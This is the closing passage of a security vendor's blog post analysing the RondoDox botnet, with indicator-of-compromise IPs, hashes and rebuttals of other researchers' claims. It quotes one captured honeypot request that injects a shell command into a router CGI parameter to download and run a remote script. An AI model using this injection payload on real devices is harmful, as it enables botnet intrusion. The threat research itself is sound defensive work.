+
+              </div>
+      
+  </article>
+
+
+<figcaption>Figure 8. Example of an array dump from an exposed page</figcaption>
+</figure>
+
+</center>
+
+<p>The claim asserts that each of the keys has a meaning related to the panel functionality, but by scrolling through the file we can observe a huge amount of different keys and values; intuitively it looks like a dump of a POST request. If we look at an identical request from our honeypots (shown below) we clearly see an exact match of the names and values between the page’s content (Fig. 8) and the POST arguments:</p>
+
+<pre style="background:#f2f2f2; padding:15px; font-size:13px; line-height:1.5; white-space: pre-wrap; overflow-wrap: anywhere; word-break: break-word;">
+<code style="color:green;">POST /tmUnblock.cgi HTTP/1.1
+Host: &lt;REDACTED&gt;:8080
+User-Agent: Mozilla/5.0 (<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="acdec3c2c8c39e9c9d9eeccdd8c3c1c5cfc1cdc5c082c5c3">[email&#160;protected]</a>)
+Connection: close
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 169
+
+submit_button=&amp;change_action=&amp;action=&amp;commit=0&amp;ttcp_num=2&amp;ttcp_size=2&amp;ttcp_ip=-h `busybox wget -qO- http://&lt;RONDO INFRA&gt;/rondo.jbt.sh|sh`&amp;StartEPI=1</code></pre>
+
+<p>We observe this pattern of the keys corresponding to POST arguments on multiple occasions where our honeypots saw the same payload as shown in the page.</p>
+
+<p>We are confident this page simply logs POST requests and shows them in the page, not having any kind of malicious intent or functionality.</p>
+
+<h2>The “P2P infrastructure” claim</h2>
+
+<p>One other claim we’ve observed was the <a href="https://beelzebub.ai/blog/rondo-dox-v2/">existence of a version 2</a> of the malware that evolved to use a distributed Command and Control (C2) infrastructure, showing resilience and evasiveness of the threat actors. The shared C2 IoCs for this new version are 74.194.191[.]52, 38.59.219[.]27 and 83.252.42[.]112, and the shared IoCs for the binary is <a href="https://www.virustotal.com/gui/file/691e4ec280aaff33270f33a9bb48a3fc38e2bd91c7359e687e3f0bd682f20b54">691e4ec280aaff33270f33a9bb48a3fc38e2bd91c7359e687e3f0bd682f20b54</a>.</p>
+
+<p>Regarding the C2 IoCs, these were not used as C2, but only to host the payloads (scripts and binaries). The table below shows when we observed the IPs being used:</p>
+
+<center>
+<table>
+	<tbody>
+		<tr>
+			<th>IP</th>
+			<th>First Seen</th>
+			<th>Last Seen</th>
+		</tr>
+		<tr>
+			<td>38.59.219[.]27</td>
+			<td>2025-07-14</td>
+			<td>2025-07-25</td>
+		</tr>
+		<tr>
+			<td>83.252.42[.]112</td>
+			<td>2025-07-29</td>
+			<td>2025-08-02</td>
+		</tr>
+		<tr>
+			<td>74.194.191[.]52</td>
+			<td>2025-08-07</td>
+			<td>2025-11-29</td>
+		</tr>
+	</tbody>
+</table>
+</center>
+
+<p>These are all residential IPs and we agree with the claim made that they’re likely compromised hosts, but from our analysis of multiple samples of the malware, including the one shared in the IoCs, we never saw any evidence of P2P functionality present. As previously presented, all the IPs used as C2s are from hosting providers.</p>
+
+<h2>Conclusion</h2>
+
+<p>The threat landscape keeps changing at a rapid pace, with new threats like RondoDox making themselves notable for how they operate. In this post we tried to shed some light on this threat and how it has evolved from an infrastructure perspective, from the initial use of a large amount of vulnerabilities, to a change in methodology that focuses on critical vulnerabilities. We showed how they segment their infrastructure, and more importantly the likelihood of compromised systems being used to host their payloads.</p>
+
+<p>There’s no one size fits all solution for protection from these threats, and it takes an ongoing effort to keep yourself protected. These threat actors capitalize on exposed and vulnerable systems to deploy their malware, which makes <a href="https://www.bitsight.com/solutions/exposure-management">exposure management</a> a must have to have the upper-hand against malicious actors.</p>
+
+<h2>IoCs</h2>
+
+<p><a href="https://github.com/bitsight-research/threat_research/tree/main/rondodox">https://github.com/bitsight-research/threat_research/tree/main/rondodox</a></p>
+
+<p><a href="https://www.virustotal.com/gui/collection/ce6375a4077edaf2f83847e3cefd8eb9535da249806d3214b22a0d50891c7b4c">https://www.virustotal.com/gui/collection/ce6375a4077edaf2f83847e3cefd8eb9535da249806d3214b22a0d50891c7b4c</a></p>
+<style type="text/css">td {background-color:#fff;text-align:left !important;}
+.text-wysiwyg__body table tr td:first-child
+{font-weight: inherit; 
+ {
+.caption figcaption {padding-top:5px;}
+</style>
+
+              </div>
+      
+    </div>
+  </div>
+
+      </div>
+
+      </div>
+    </div>
+  
+
+    </div>
+    <div class="sidebar">
+      
+      
+<div class="block jump-menu__container rounded padded" data-jump-menu-target-selector=".jump-menu__content h2" data-jump-menu-title="On this page"></div>
+
+          </div>
+  </div>
+</article>
+
+      </div>
+  <div class="views-element-container block block-views block-views-blockrelated-blogs-related-blog" id="block-bitsight-theme-views-block-related-blogs">
+    
+    
+          
+<div><div class="grid-cols-3 bg-color--charcoal view view-related-blogs view-id-related_blogs view-display-id-related_blog js-view-dom-id-6ad05cfd8d7a404c6529ee278c7964898daddc8de3b55e5880222f59f013e229">
+          
+        
+          <div class="view-header">
+        <div class="container text-color--text-light">
+<h2>Explore more about this topic</h2>
+<a href="/blog" class="btn btn--primary" aria-label>View all blogs</a>
+</div>
+      </div>
+            
+          <div class="view-content">
+            <div class="views-row">
+
+<article  class="rounded card-with-image bg-color--white">
+            <div class="card-with-image__media">
+          
+            <div class="field field--name-field-image field--type-image field--label-hidden field__item">
+                            <img loading="lazy" src="/sites/default/files/styles/4_3_small/public/2026/08/24/ai%20jailbreaking%20prompts%20blog.jpeg.webp?itok=1R0bTWYy" width="420" height="315" alt="ai jailbreaking prompts blog" />
+
+
+
+              </div>
+      
+
+      </div>
+      
+  <div class="card-with-image__content">
+          <div class="authored-date">
+        <span >August 25, 2026</span>
+      </div>
+    
+          
+<div class="card-tags">
+  <span class="card__flag">
+    Vulnerabilities &amp; Incidents
+  </span>
+  </div>
+    
+        <div class='card-with-image__heading-wrapper'>
+      
+
+  <h2  class="heading card-with-image__title heading__with-link">
+          <a href="/blog/ai-jailbreak-prompts-evolving-cyber-threats" class="heading--link"><span>New Bitsight Research Shows AI Abuse Is Moving Beyond the Jailbreak Prompt</span>
+</a>
+          </h2>
+    </div>
+          
+  <div class="body-text">
+              New Bitsight research reveals how AI jailbreak prompts are evolving into agent abuse, prompt injection, MCP risks, and real-world cyber operations.
+        </div>
+              
+  <a href="/blog/ai-jailbreak-prompts-evolving-cyber-threats"  aria-label="New Bitsight Research Shows AI Abuse Is Moving Beyond the Jailbreak Prompt" class="link link--primary">
+    Read blog post
+  </a>
+      </div>
+</article>
+</div>
+    <div class="views-row">
+
+<article  class="rounded card-with-image bg-color--white">
+            <div class="card-with-image__media">
+          
+            <div class="field field--name-field-image field--type-image field--label-hidden field__item">
+                            <img loading="lazy" src="/sites/default/files/styles/4_3_small/public/2026/08/13/Who%20Invited%20Aisuru%20to%20the%20LAN%20Party%20blog%20banner.png.webp?itok=1krI4O4p" width="420" height="315" alt="Who Invited Aisuru to the LAN Party blog banner" />
+
+
+
+              </div>
+      
+
+      </div>
+      
+  <div class="card-with-image__content">
+          <div class="authored-date">
+        <span >August 18, 2026</span>
+      </div>
+    
+          
+<div class="card-tags">
+  <span class="card__flag">
+    Bitsight Research
+  </span>
+  </div>
+    
+        <div class='card-with-image__heading-wrapper'>
+      
+
+  <h2  class="heading card-with-image__title heading__with-link">
+          <a href="/blog/who-invited-aisuru-lan-party" class="heading--link"><span>Who Invited Aisuru to the LAN Party?</span>
+</a>
+          </h2>
+    </div>
+          
+  <div class="body-text">
+              Explore Bitsight TRACE research into Aisuru’s DDoS operations, C2 infrastructure, ADB exploitation, and evolution toward a new proxy network.
+        </div>
+              
+  <a href="/blog/who-invited-aisuru-lan-party"  aria-label="Who Invited Aisuru to the LAN Party?" class="link link--primary">
+    Read blog post
+  </a>
+      </div>
+</article>
+</div>
+    <div class="views-row">
+
+<article  class="rounded card-with-image bg-color--white">
+            <div class="card-with-image__media">
+          
+            <div class="field field--name-field-image field--type-image field--label-hidden field__item">
+                            <img loading="lazy" src="/sites/default/files/styles/4_3_small/public/2026/07/31/thousands%20of%20atgs%20left%20the%20internet%20blog.jpeg.webp?itok=bUuNXz2w" width="420" height="315" alt="thousands of atgs left the internet blog" />
+
+
+
+              </div>
+      
+
+      </div>
+      
+  <div class="card-with-image__content">
+          <div class="authored-date">
+        <span >August 06, 2026</span>
+      </div>
+    
+          
+<div class="card-tags">
+  <span class="card__flag">
+    Bitsight Research
+  </span>
+  </div>
+    
+        <div class='card-with-image__heading-wrapper'>
+      
+
+  <h2  class="heading card-with-image__title heading__with-link">
+          <a href="/blog/thousands-exposed-fuel-gauges-just-left-internet" class="heading--link"><span>Thousands of Exposed Fuel Gauges Just Left the Internet</span>
+</a>
+          </h2>
+    </div>
+          
+  <div class="body-text">
+              Bitsight research finds a sharp decline in exposed Automatic Tank Gauges across the U.S. Explore the data, likely causes, and remaining ICS security risks.
+        </div>
+              
+  <a href="/blog/thousands-exposed-fuel-gauges-just-left-internet"  aria-label="Thousands of Exposed Fuel Gauges Just Left the Internet" class="link link--primary">
+    Read blog post
+  </a>
+      </div>
+</article>
+</div>
+
+      </div>
+    
+                      </div>
+</div>
+
+      </div>
+
+  </div>
+
+
+          </div>  </main>
+
+  
+      <footer role="contentinfo" class="site-footer footer">
+      <div class="site-footer__inner container">
+        <div class="site-footer__logo">
+                    <a href="/">
+            <img src="/themes/custom/bitsight_theme/dist/images/bitsight-logo-white-text.svg" alt="Bitsight" />
+          </a>
+          <div class="site-footer__text">
+            
+
+  <div class="region region-footer-left site-footer__text">
+      <div id="block-site-information" class="block block-config-pages block-config-pages-block">
+    
+    
+          <div class="config_pages config_pages--type--bitsight-information config_pages--view-mode--full config_pages--bitsight-information--full">
+  
+            <div class="clearfix text-formatted field field--name-field-business-address field--type-text-long field--label-hidden field__item">
+                          <p>BitSight Technologies, Inc.<br>
+111 Huntington Ave, Suite 400<br>
+Boston, MA 02199<br>
+United States of America</p>
+
+<p><a href="tel:+16172450469">+1-617-245-0469</a></p>
+
+<p align="left"><br>
+<a href="https://app.termscout.com/certify/bitsight-certified-contract"><img alt="TermScout logo" src="/sites/default/files/2024/10/10/Favorable_TermScout.svg" width="95"> </a></p>
+
+              </div>
+      
+</div>
+
+      </div>
+
+  </div>
+
+          </div>
+        </div>
+
+        
+  
+  <div id="block-reports" class="block block-system block-system-menu-blockreports site-footer__reports">
+          <div class="site-footer__menu-title">
+        Free Cyber Security Reports
+      </div>
+    
+          
+      <ul class="menu menu--vertical">
+    
+          <li>
+        <a href="/report/security-ratings-snapshot" data-drupal-link-system-path="node/356">Security Ratings Snapshot</a>
+              </li>
+          <li>
+        <a href="https://www.bitsight.com/report/state-of-the-underground-2026">2026 State Of The Underground Report</a>
+              </li>
+          <li>
+        <a href="/resources/the-marsh-mclennan-cyber-risk-analytics-center-study-finds-statistically-significant-correlation-between-bitsight-analytics-and-cybersecurity-incidents" data-drupal-link-system-path="node/10956">Marsh McLennan Cyber Risk Report</a>
+              </li>
+          <li>
+        <a href="/report/free-third-party-risk-management-report">Third-Party Vendor Risk Report</a>
+              </li>
+          <li>
+        <a href="/demo/bitsight-demo" data-drupal-link-system-path="node/8866">Get A Free Demo</a>
+              </li>
+        
+  </ul>
+  
+
+
+      </div>
+<div id="block-footer" class="block block-system block-system-menu-blockfooter site-footer__menus">
+  
+    
+      
+      <ul class="menu menu--vertical">
+    
+          <li>
+        <a href="https://academy.bitsight.com">Bitsight Academy</a>
+              </li>
+          <li>
+        <a href="https://help.bitsighttech.com/hc/en-us">Bitsight Knowledge Base</a>
+              </li>
+          <li>
+        <a href="/privacy-policy" data-drupal-link-system-path="node/216">Privacy Statement</a>
+              </li>
+          <li>
+        <a href="/corporate-social-responsibility-statement" data-drupal-link-system-path="node/11196">Corporate Social Responsibility Statement</a>
+              </li>
+          <li>
+        <a href="https://www.bitsight.com/sites/default/files/2025-09/BitSight%20Technologies%20Inc%20UK%20Modern%20Slavery%20Act%20Statement.pdf">UK Modern Slavery Act Statement</a>
+              </li>
+          <li>
+        <a href="/security" data-drupal-link-system-path="node/226">Security</a>
+              </li>
+          <li>
+        <a href="/security-ratings-access-terms" data-drupal-link-system-path="node/401">Bitsight Security Ratings Access Terms</a>
+              </li>
+          <li>
+        <a href="/terms-of-use" data-drupal-link-system-path="node/10286">Website Terms Of Use</a>
+              </li>
+          <li>
+        <a href="/compare" data-drupal-link-system-path="node/15896">Compare Bitsight</a>
+              </li>
+          <li>
+        <a href="/glossary" data-drupal-link-system-path="node/13276">Cybersecurity Glossary</a>
+              </li>
+          <li>
+        <a href="https://submit-irm.trustarc.com/services/validation/313077aa-ba94-46d5-8cdb-1eec02a3553a">Do Not Sell or Share My Personal Information</a>
+              </li>
+          <li>
+        <a href="https://www.bitsight.com/bitsight-order-fulfillment-policy">Order Fulfillment Policy</a>
+              </li>
+          <li class="menu-item menu_item--consent">
+    <div id="teconsent"></div>
+  </li>
+
+  </ul>
+  
+
+
+  </div>
+
+
+        
+
+  <div class="region region-footer-right site-footer__text">
+      <div id="block-config-pages" class="block block-config-pages block-config-pages-block">
+    
+    
+          <div class="config_pages config_pages--type--bitsight-footer-cta config_pages--view-mode--full config_pages--bitsight-footer-cta--full">
+  
+            <div class="clearfix text-formatted field field--name-field-footer-cta field--type-text-long field--label-hidden field__item">
+                          <a href="/contact-us" class="btn btn--neutral">Contact Us</a>
+              </div>
+      
+</div>
+
+      </div>
+
+  </div>
+
+      </div>
+
+      
+
+  <div class="region region-addendum site-footer__addendum">
+    <div class="site-footer__inner container">
+      
+  <div id="block-copyright" class="block block-config-pages block-config-pages-block site-footer__copyright">
+          <div class="config_pages config_pages--type--copyright config_pages--view-mode--full config_pages--copyright--full">
+  
+            <div class="field field--name-field-copyright field--type-string-long field--label-hidden field__item">&copy; 2026 BitSight Technologies, Inc. and its Affiliates. All Rights Reserved.</div>
+      
+</div>
+
+      </div>
+
+  <div id="block-social" class="block block-system block-system-menu-blocksocial site-footer__social-menu">
+          
+
+
+<div class="social-menu">
+  <ul class="social-menu-items">
+          <li class="social-menu-item">
+        <a href="https://www.facebook.com/BitSight" title="Facebook" class="site-footer__social-icon">
+          <span class="visually-hidden">Facebook</span>
+            <div class="icon ">
+    <svg width="28" height="30" viewBox="0 0 28 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path fill-rule="evenodd" clip-rule="evenodd"
+    d="M6.67688 2.5C4.46774 2.5 2.67688 4.29086 2.67688 6.5V23.5C2.67688 25.7091 4.46774 27.5 6.67688 27.5H13.8585V18.9472H11.1824V15.6141H13.8585V13.1561C13.8585 10.3034 15.478 8.75 17.8444 8.75C18.978 8.75 19.9516 8.8411 20.2357 8.8816V11.8632L18.5947 11.8641C17.308 11.8641 17.0591 12.5221 17.0591 13.4865V15.615H20.1279L19.7283 18.9482H17.0591V27.5H21.31C23.5191 27.5 25.31 25.7091 25.31 23.5V6.5C25.31 4.29086 23.5191 2.5 21.31 2.5H6.67688Z"
+    fill="white" />
+</svg>
+  </div>
+
+        </a>
+      </li>
+          <li class="social-menu-item">
+        <a href="https://www.instagram.com/bitsight/" title="Instagram" class="site-footer__social-icon">
+          <span class="visually-hidden">Instagram</span>
+            <div class="icon ">
+    <svg width="28" height="30" viewBox="0 0 28 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path fill-rule="evenodd" clip-rule="evenodd"
+    d="M13.8224 2.5C10.749 2.5 10.3643 2.51458 9.15717 2.575C5.04737 2.78333 2.76331 5.30208 2.5747 9.84583C2.51906 11.1802 2.50586 11.6052 2.50586 15C2.50586 18.3948 2.51906 18.8208 2.57376 20.1542C2.76237 24.6938 5.04265 27.2167 9.15622 27.425C10.3643 27.4854 10.749 27.5 13.8224 27.5C16.8958 27.5 17.2815 27.4854 18.4886 27.425C22.5946 27.2167 24.8844 24.6979 25.0701 20.1542C25.1258 18.8208 25.139 18.3948 25.139 15C25.139 11.6052 25.1258 11.1802 25.0711 9.84688C24.8862 5.31146 22.6031 2.78438 18.4896 2.57604C17.2815 2.51458 16.8958 2.5 13.8224 2.5ZM13.8224 8.58125C10.6132 8.58125 8.01137 11.4552 8.01137 15C8.01137 18.5448 10.6132 21.4198 13.8224 21.4198C17.0316 21.4198 19.6335 18.5458 19.6335 15C19.6335 11.4552 17.0316 8.58125 13.8224 8.58125ZM13.8224 19.1667C11.7392 19.1667 10.0502 17.3021 10.0502 15C10.0502 12.699 11.7392 10.8333 13.8224 10.8333C15.9056 10.8333 17.5946 12.699 17.5946 15C17.5946 17.3021 15.9056 19.1667 13.8224 19.1667ZM19.8636 6.82812C19.1129 6.82812 18.5046 7.5 18.5046 8.32812C18.5046 9.15625 19.1129 9.82812 19.8636 9.82812C20.6133 9.82812 21.2206 9.15625 21.2206 8.32812C21.2206 7.5 20.6133 6.82812 19.8636 6.82812Z"
+    fill="white" />
+</svg>
+  </div>
+
+        </a>
+      </li>
+          <li class="social-menu-item">
+        <a href="https://www.linkedin.com/company/bitsight/" title="Linkedin" class="site-footer__social-icon">
+          <span class="visually-hidden">Linkedin</span>
+            <div class="icon ">
+    <svg width="30" height="30" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path
+    d="M23.75 3.75C24.413 3.75 25.0489 4.01339 25.5178 4.48223C25.9866 4.95107 26.25 5.58696 26.25 6.25V23.75C26.25 24.413 25.9866 25.0489 25.5178 25.5178C25.0489 25.9866 24.413 26.25 23.75 26.25H6.25C5.58696 26.25 4.95107 25.9866 4.48223 25.5178C4.01339 25.0489 3.75 24.413 3.75 23.75V6.25C3.75 5.58696 4.01339 4.95107 4.48223 4.48223C4.95107 4.01339 5.58696 3.75 6.25 3.75H23.75ZM23.125 23.125V16.5C23.125 15.4192 22.6957 14.3828 21.9315 13.6185C21.1672 12.8543 20.1308 12.425 19.05 12.425C17.9875 12.425 16.75 13.075 16.15 14.05V12.6625H12.6625V23.125H16.15V16.9625C16.15 16 16.925 15.2125 17.8875 15.2125C18.3516 15.2125 18.7967 15.3969 19.1249 15.7251C19.4531 16.0533 19.6375 16.4984 19.6375 16.9625V23.125H23.125ZM8.6 10.7C9.15695 10.7 9.6911 10.4788 10.0849 10.0849C10.4788 9.6911 10.7 9.15695 10.7 8.6C10.7 7.4375 9.7625 6.4875 8.6 6.4875C8.03973 6.4875 7.50241 6.71007 7.10624 7.10624C6.71007 7.50241 6.4875 8.03973 6.4875 8.6C6.4875 9.7625 7.4375 10.7 8.6 10.7ZM10.3375 23.125V12.6625H6.875V23.125H10.3375Z"
+    fill="white" />
+</svg>
+  </div>
+
+        </a>
+      </li>
+          <li class="social-menu-item">
+        <a href="https://twitter.com/BitSight" title="Twitter" class="site-footer__social-icon">
+          <span class="visually-hidden">Twitter</span>
+            <div class="icon ">
+    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="30" viewBox="0 0 512 512"><!--!Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2024 Fonticons, Inc.--><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+  </div>
+
+        </a>
+      </li>
+          <li class="social-menu-item">
+        <a href="https://www.youtube.com/channel/UCQK4819a_k18f2GGC3Fkv8g" title="YouTube" class="site-footer__social-icon">
+          <span class="visually-hidden">YouTube</span>
+            <div class="icon ">
+    <svg width="28" height="30" viewBox="0 0 28 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path fill-rule="evenodd" clip-rule="evenodd"
+    d="M21.517 6.4418C18.1183 6.18555 10.5484 6.18659 7.15442 6.4418C3.47937 6.71888 3.04651 9.17096 3.01917 15.6251C3.04651 22.0678 3.4756 24.5303 7.15442 24.8085C10.5494 25.0637 18.1183 25.0647 21.517 24.8085C25.1921 24.5314 25.6249 22.0793 25.6523 15.6251C25.6249 9.18242 25.1959 6.71992 21.517 6.4418ZM11.5066 19.7918V11.4585L19.051 15.6178L11.5066 19.7918Z"
+    fill="white" />
+</svg>
+  </div>
+
+        </a>
+      </li>
+      </ul>
+</div>
+
+      </div>
+
+    </div>
+  </div>
+
+      
+
+    </footer>
+  
+</div>
+
+  </div>
+
+    
+    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="application/json" data-drupal-selector="drupal-settings-json">{"path":{"baseUrl":"\/","pathPrefix":"","currentPath":"node\/18826","currentPathIsAdmin":false,"isFront":false,"currentLanguage":"en"},"pluralDelimiter":"\u0003","suppressDeprecationErrors":true,"ajaxPageState":{"libraries":"eJyNVFGymzAMvBDGM70QY2xBlBiLWgLC7SsgTF8xr_N-DOwq9mq1sUuCLYl1x7PuKA9VCyKQG3iPxBCaDqN-su0hQXbxO5ohgpfGxdgkSlC1KIz9QxpPw0DJPqdhbAZI019GHjCAbSmsRuAtBTGJULqi3uVgFpSHwcH1cKX7SO0m8l_0AS5g6q_wpsncaYpupakQdKDm1_tKDA7T7T4DBHRXMFEAY9pIhZ6DGTOpqUVnDC77h2mpOJ5RwHREOodbauv-nlpQD3QRctErk0cXb5viqWWfsS0Uiuu5wHSwZlkZl7Vod4H2CNwJfwD7JTv0QuDKv9RIodwIURQc2XaZkhhIwTz_T7OscRt9WaPLuBqXNEeClAx7deLbOpohZ7Xr7rS9YtMREZJKD9DMLmLY922evyfIq_VzfbzV5wY_rccOflr64bSeMlhMGonk4snubutA1JCXDXkalfp8Vp0a5hZg0sF8ea957qsj-E1A9psNq9U_uKdY7fG2xw1QezdumqozV82eK9WAUvHKAjpXx1DNCAvbfa0HCpN6fs7986zd070LUO8XTaPUAcRh5JrdXP7yWiTU9zcHnGUDMG-XyJXflj-zfwMG","theme":"bitsight_theme","theme_token":null},"ajaxTrustedUrl":{"\/search":true,"form_action_p_pvdeGsVG5zNF_XLGPTvYSKCf43t8qZYSwcfZl2uzM":true,"\/blog\/rondodox-botnet-infrastructure-analysis?ajax_form=1":true},"clientside_validation_jquery":{"validate_all_ajax_forms":1,"force_validate_on_blur":false,"force_html5_validation":false,"messages":{"required":"This field is required.","remote":"Please fix this field.","email":"Please enter a valid email address.","url":"Please enter a valid URL.","date":"Please enter a valid date.","dateISO":"Please enter a valid date (ISO).","number":"Please enter a valid number.","digits":"Please enter only digits.","equalTo":"Please enter the same value again.","maxlength":"Please enter no more than {0} characters.","minlength":"Please enter at least {0} characters.","rangelength":"Please enter a value between {0} and {1} characters long.","range":"Please enter a value between {0} and {1}.","max":"Please enter a value less than or equal to {0}.","min":"Please enter a value greater than or equal to {0}.","step":"Please enter a multiple of {0}."}},"data":{"extlink":{"extTarget":true,"extTargetAppendNewWindowDisplay":true,"extTargetAppendNewWindowLabel":"(opens in a new window)","extTargetNoOverride":false,"extNofollow":true,"extTitleNoOverride":false,"extNoreferrer":true,"extFollowNoOverride":false,"extClass":"0","extLabel":"(link is external)","extImgClass":false,"extSubdomains":true,"extExclude":"embed\/iframe","extInclude":"\\.pdf","extCssExclude":"","extCssInclude":"","extCssExplicit":"","extAlert":false,"extAlertText":"This link will take you to an external web site. We are not responsible for their content.","extHideIcons":false,"mailtoClass":"0","telClass":"","mailtoLabel":"(link sends email)","telLabel":"(link is a phone number)","extUseFontAwesome":false,"extIconPlacement":"append","extPreventOrphan":false,"extFaLinkClasses":"fa fa-external-link","extFaMailtoClasses":"fa fa-envelope-o","extAdditionalLinkClasses":"","extAdditionalMailtoClasses":"","extAdditionalTelClasses":"","extFaTelClasses":"fa fa-phone","allowedDomains":[],"extExcludeNoreferrer":""}},"ckeditor_tooltips":{"followCursor":false,"interactive":1,"allowHTML":1,"maxWidth":500,"trigger":"mouseenter","offset":[0,15],"animation":"scale","inertia":true},"sitewideAlert":{"refreshInterval":15000,"automaticRefresh":false,"showCount":false,"serverSideRender":false},"antibot":{"forms":{"webform-submission-subscribe-node-18826-add-form":{"id":"webform-submission-subscribe-node-18826-add-form","key":"Q8l4w9mstDwUjZ1_HzFQnTzq1BDrBkp_UaSalhfHn8G"}}},"ajax":{"edit-actions-submit":{"callback":"::submitAjaxForm","event":"click","effect":"fade","speed":500,"progress":{"type":"throbber","message":""},"disable-refocus":true,"url":"\/blog\/rondodox-botnet-infrastructure-analysis?ajax_form=1","httpMethod":"POST","dialogType":"ajax","submit":{"_triggering_element_name":"op","_triggering_element_value":"Subscribe"}}},"user":{"uid":0,"permissionsHash":"3329f67348912164efbd053d3701bc1cfd16c483b9bc1bf2c72b909a81cedb9b"}}</script>
+<script src="/sites/default/files/js/js_G4YjWmklcEmzcTdhw6KtFGpoQyYApuuQd8RRkbVGICs.js?scope=footer&amp;delta=0&amp;language=en&amp;theme=bitsight_theme&amp;include=eJyNkmuOgzAMhC8E5EiRIQM1TWI2MZTeftMWtFVptf0TP77RSLZDUbkVNfSITS8pVC1UkSzWSTKc7dmXMpsBEYn8J5zh0akl722UiKplzTyc1HYSgkQzzmGyAXH-I3pCgGlnVYmv3UAc63fyDErdqW5lPRBWXNihJo-kByodk39vObe5S9ziFVzQPjayt7eGeRpOzoxcdWc4VklWRbzylE2fJGqN6OrxHS7PdL0Rz4jFzMEu5NmRskQ7_sxIV9MtzSNrdoNv9dzjW-nGil4SDMdyzUh-p_f5sarneDYuzVNBW1n1ZUK6IEtZ1VPe5GWo9mPY-zGKLWu1b2-LDY20HprlG5UbaeOgxD43mRb8K1IZBv9ZFpAzDUd-e34BOAIwlw"></script>
+<script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"></script>
+<script src="/sites/default/files/js/js_KHxecRyhPmpLip522OdegFEe-dCeiND9g87pU5LBWOk.js?scope=footer&amp;delta=2&amp;language=en&amp;theme=bitsight_theme&amp;include=eJyNkmuOgzAMhC8E5EiRIQM1TWI2MZTeftMWtFVptf0TP77RSLZDUbkVNfSITS8pVC1UkSzWSTKc7dmXMpsBEYn8J5zh0akl722UiKplzTyc1HYSgkQzzmGyAXH-I3pCgGlnVYmv3UAc63fyDErdqW5lPRBWXNihJo-kByodk39vObe5S9ziFVzQPjayt7eGeRpOzoxcdWc4VklWRbzylE2fJGqN6OrxHS7PdL0Rz4jFzMEu5NmRskQ7_sxIV9MtzSNrdoNv9dzjW-nGil4SDMdyzUh-p_f5sarneDYuzVNBW1n1ZUK6IEtZ1VPe5GWo9mPY-zGKLWu1b2-LDY20HprlG5UbaeOgxD43mRb8K1IZBv9ZFpAzDUd-e34BOAIwlw"></script>
+
+  </body>
+</html>
